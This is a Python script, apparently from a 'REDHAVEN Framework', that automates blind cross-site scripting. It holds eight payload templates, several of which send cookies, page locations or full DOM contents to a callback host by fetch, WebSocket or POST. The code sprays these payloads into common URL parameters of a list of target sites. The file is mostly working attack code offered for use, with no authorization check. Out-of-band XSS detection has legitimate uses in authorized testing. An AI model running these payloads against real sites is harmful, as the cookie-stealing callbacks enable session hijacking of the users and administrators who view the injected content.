#!/usr/bin/env python3
"""
Blind XSS Hunter - REDHAVEN Framework
Uses callback mechanism to detect XSS in async/hidden contexts
Supports: Burp Collaborator, Interact.sh, XSS Hunter, Custom callback server
"""

import sys
import argparse
import requests
import urllib.parse
import random
import string
from typing import List, Dict

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  BLIND XSS HUNTER - Out-of-Band XSS Detection            ║
║  Part of REDHAVEN Framework v1.2.4                       ║
╚══════════════════════════════════════════════════════════╝
"""

# Payload templates with callback placeholder
BLIND_XSS_PAYLOADS = [
    # Image tag with error handler
    '<img src=x onerror="fetch(\'https://{CALLBACK}/xss?loc=\'+encodeURIComponent(document.location)+\'&cookie=\'+encodeURIComponent(document.cookie))">',
    
    # Script tag with external load
    '<script src="https://{CALLBACK}/xss.js"></script>',
    
    # SVG-based
    '<svg onload="fetch(\'https://{CALLBACK}/xss?dom=\'+btoa(document.documentElement.innerHTML))">',
    
    # Link prefetch (Chrome background execution)
    '<link rel=prefetch href="https://{CALLBACK}/xss?ref=prefetch">',
    
    # Meta refresh
    '<meta http-equiv="refresh" content="0;url=https://{CALLBACK}/xss?type=meta">',
    
    # Form action hijack
    '"><form action="https://{CALLBACK}/xss"><input type=submit value="Click">',
    
    # WebSocket callback
    '<script>new WebSocket("wss://{CALLBACK}/ws").send(document.cookie)</script>',
    
    # Fetch API exfil
    '<script>fetch("https://{CALLBACK}/xss",{method:"POST",body:JSON.stringify({cookie:document.cookie,url:location.href})})</script>',
]

# Common injection points
INJECTION_CONTEXTS = {
    'name': ['name', 'username', 'fullname', 'displayname', 'author'],
    'email': ['email', 'mail', 'contact'],
    'message': ['message', 'msg', 'comment', 'text', 'body', 'content', 'description'],
    'search': ['q', 'search', 'query', 'keyword'],
    'profile': ['bio', 'about', 'profile', 'signature'],
    'misc': ['title', 'subject', 'company', 'location', 'website', 'url'],
}

class BlindXSSHunter:
    def __init__(self, callback_domain: str, custom_payloads: List[str] = None):
        self.callback_domain = callback_domain.rstrip('/')
        self.payloads = custom_payloads or BLIND_XSS_PAYLOADS
        
    def generate_payloads(self, context_id: str = None) -> List[str]:
        """Generate payloads with callback domain and optional context ID."""
        generated = []
        
        for payload in self.payloads:
            callback_url = self.callback_domain
            if context_id:
                callback_url += f"/{context_id}"
            
            final_payload = payload.replace('{CALLBACK}', callback_url.replace('https://', '').replace('http://', ''))
            generated.append(final_payload)
        
        return generated
    
    def inject_into_parameters(self, url: str, context: str = 'all') -> List[Dict]:
        """Inject Blind XSS payloads into URL parameters."""
        results = []
        
        # Generate unique context ID
        context_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        payloads = self.generate_payloads(context_id)
        
        # Determine which parameters to test
        params_to_test = []
        if context == 'all':
            for param_list in INJECTION_CONTEXTS.values():
                params_to_test.extend(param_list)
        else:
            params_to_test = INJECTION_CONTEXTS.get(context, [])
        
        print(f"\n[*] Testing context: {context}")
        print(f"[*] Callback ID: {context_id}")
        print(f"[*] Target: {url}")
        
        for payload in payloads[:3]:  # Test top 3 payloads per parameter to avoid spam
            for param in params_to_test:
                try:
                    # Build test URL
                    parsed = urllib.parse.urlparse(url)
                    query_params = urllib.parse.parse_qs(parsed.query)
                    query_params[param] = [payload]
                    
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    # Send request
                    response = requests.get(test_url, timeout=5, allow_redirects=True)
                    
                    results.append({
                        'url': test_url,
                        'param': param,
                        'payload': payload[:50] + '...',
                        'context_id': context_id,
                        'status': response.status_code
                    })
                    
                    print(f"    [+] Injected into {param} (Status: {response.status_code})")
                    
                except Exception as e:
                    print(f"    [-] Error testing {param}: {e}")
        
        return results
    
    def inject_into_forms(self, url: str) -> List[Dict]:
        """Discover forms and inject payloads."""
        print(f"\n[*] Discovering forms at: {url}")
        
        try:
            response = requests.get(url, timeout=10)
            # Simple form detection (in production, use BeautifulSoup)
            if '<form' in response.text.lower():
                print(f"    [+] Forms detected - Manual injection recommended")
                print(f"    [i] Use payloads with callback: {self.callback_domain}")
                return [{'url': url, 'note': 'Forms found, requires manual testing'}]
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return []

def setup_callback_info():
    """Display information about setting up callback servers."""
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║  CALLBACK SERVER SETUP                                            ║
╠═══════════════════════════════════════════════════════════════════╣
║  Option 1: Burp Collaborator (Professional only)                  ║
║    - Generate: burpcollaborator.net/xxxxx                         ║
║    - Monitor: Burp Suite > Collaborator tab                       ║
║                                                                   ║
║  Option 2: Interact.sh (Free, by ProjectDiscovery)                ║
║    - Install: go install github.com/projectdiscovery/interactsh   ║
║    - Run: interactsh-client                                       ║
║    - Get domain: xxx.interact.sh                                  ║
║                                                                   ║
║  Option 3: XSS Hunter Express (Self-hosted)                       ║
║    - Repo: github.com/mandatoryprogrammer/xsshunter-express       ║
║    - Deploy: Docker or VPS                                        ║
║                                                                   ║
║  Option 4: Custom Webhook (RequestBin, Webhook.site)              ║
║    - Quick test: webhook.site                                     ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Blind XSS Hunter - Out-of-Band XSS Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', help='Target URL to test')
    parser.add_argument('-l', '--list', help='File with list of URLs')
    parser.add_argument('-c', '--callback', required=False, help='Callback domain (e.g., xxx.interact.sh)')
    parser.add_argument('--context', choices=['all', 'name', 'email', 'message', 'search', 'profile', 'misc'],
                       default='all', help='Injection context to test')
    parser.add_argument('--setup-info', action='store_true', help='Show callback server setup information')
    
    args = parser.parse_args()
    
    if args.setup_info:
        setup_callback_info()
        sys.exit(0)
    
    if not args.callback:
        print("[!] No callback domain specified.")
        print("[i] Use --setup-info to see how to set up a callback server")
        print("[i] Example: python3 blind_xss.py -u https://target.com -c xxx.interact.sh")
        sys.exit(1)
    
    # Initialize hunter
    hunter = BlindXSSHunter(args.callback)
    
    # Collect targets
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"[X] Error reading file: {e}")
            sys.exit(1)
    
    if not targets:
        print("[X] No targets specified")
        sys.exit(1)
    
    print(f"[*] Testing {len(targets)} targets")
    print(f"[*] Callback server: {args.callback}")
    print(f"[!] Monitor your callback server for incoming requests!")
    print("="*70)
    
    all_results = []
    
    for target in targets:
        # Test URL parameters
        results = hunter.inject_into_parameters(target, args.context)
        all_results.extend(results)
        
        # Check for forms
        hunter.inject_into_forms(target)
    
    print("\n" + "="*70)
    print(f"[+] Injection complete: {len(all_results)} payloads sent")
    print(f"[!] CHECK YOUR CALLBACK SERVER: {args.callback}")
    print(f"[i] Wait 5-10 minutes for async processing (emails, admin panels, etc.)")
    print("="*70)

if __name__ == '__main__':
    main()
